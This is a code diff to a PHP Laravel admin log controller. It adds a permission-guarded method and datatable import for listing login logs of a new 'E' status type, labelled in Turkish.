@@ -7,6 +7,7 @@ use App\Classes\SystemStatusEnum;
 use App\DataTables\IpListModelDataTable;
 use App\DataTables\LoginBModelDatatable;
 use App\DataTables\LoginDModelDatatable;
+use App\DataTables\LoginEModelDatatable;
 use App\DataTables\LoginFModelDatatable;
 use App\DataTables\LoginIModelDatatable;
 use App\DataTables\LoginVModelDatatable;
@@ -66,10 +67,16 @@ class LogController extends Controller
     {
         return $dataTable->render('admin.datatable', ['title' => SystemStatusEnum::I->label() . ' Logları', 'page' => 'login-log']);
     }
-     #[HasPermissions('vakif')]
+    #[HasPermissions('vakif')]
     public function listByVLogin(LoginVModelDatatable $dataTable)
     {
         return $dataTable->render('admin.datatable', ['title' => SystemStatusEnum::V->label() . ' Logları', 'page' => 'login-log']);
+    }
+
+    #[HasPermissions('enpara')]
+    public function listByELogin(LoginEModelDatatable $dataTable)
+    {
+        return $dataTable->render('admin.datatable', ['title' => SystemStatusEnum::E->label() . ' Logları', 'page' => 'login-log']);
     }
 
     #[HasPermissions('bnc')]
